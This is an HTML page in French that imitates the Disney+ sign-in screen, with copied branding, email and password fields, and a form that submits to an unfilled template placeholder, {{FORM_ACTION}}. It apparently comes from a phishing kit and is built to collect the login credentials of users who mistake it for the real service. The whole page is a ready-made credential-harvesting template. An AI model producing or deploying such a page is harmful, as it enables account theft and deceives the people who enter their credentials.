<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disney+ | Films et séries en streaming</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Avenir', 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 30%, #16213e 60%, #0f3460 100%); min-height: 100vh; color: #fff; }
        .header { padding: 20px 3%; }
        .logo { font-size: 2rem; font-weight: 700; color: #113ccf; }
        .center { display: flex; justify-content: center; align-items: center; min-height: 85vh; padding: 20px; }
        .card { background: rgba(255,255,255,0.08); backdrop-filter: blur(10px); width: 100%; max-width: 400px; padding: 48px 40px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); }
        h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 24px; }
        input { width: 100%; height: 48px; padding: 14px 18px; margin-bottom: 16px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: #fff; font-size: 16px; }
        input::placeholder { color: rgba(255,255,255,0.5); }
        input:focus { outline: none; border-color: #113ccf; background: rgba(255,255,255,0.15); }
        button { width: 100%; height: 48px; background: #113ccf; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        button:hover { background: #0d2da3; }
        .footer { font-size: 13px; color: rgba(255,255,255,0.6); margin-top: 24px; text-align: center; }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">Disney+</div>
    </header>
    <div class="center">
        <div class="card">
            <h1>Connectez-vous avec votre e-mail</h1>
            <form method="POST" action="{{FORM_ACTION}}">
                <input type="text" name="login" placeholder="Adresse e-mail" required autocomplete="username">
                <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
                <button type="submit">Connexion</button>
            </form>
            <p class="footer">En vous connectant, vous acceptez nos Conditions d'utilisation.</p>
        </div>
    </div>
</body>
</html>
